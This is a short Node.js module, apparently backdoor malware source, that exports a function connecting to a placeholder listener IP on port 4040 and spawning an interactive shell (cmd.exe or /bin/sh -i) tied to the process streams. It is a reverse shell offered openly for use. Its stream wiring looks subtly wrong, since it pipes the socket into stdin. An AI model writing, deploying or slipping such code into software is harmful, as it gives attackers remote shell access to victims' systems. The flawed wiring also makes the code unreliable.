const net = require('net');
const { spawn } = require('child_process');
const os = require('os');

const backdoor = () => {
    const socket = new net.Socket();

    socket.connect(4040, '<listner\'s ip address>', () => {
        // Connection established
        socket.pipe(process.stdin);
        socket.pipe(process.stdout);
        socket.pipe(process.stderr);
    });

    // Handle errors and close event
    socket.on('error', (err) => {
        console.error('Error connecting to the remote server:', err.message);
        socket.destroy();
    });

    socket.on('close', () => {
        console.log('Connection to the remote server closed.');
    });

    // Determine the operating system and spawn the appropriate shell
    const shellCommand = os.platform() === 'win32' ? 'cmd.exe' : '/bin/sh';
    const shellArgs = os.platform() === 'win32' ? [] : ['-i'];

    const shell = spawn(shellCommand, shellArgs, {
        stdio: [process.stdin, process.stdout, process.stderr],
    });
};

module.exports = backdoor;
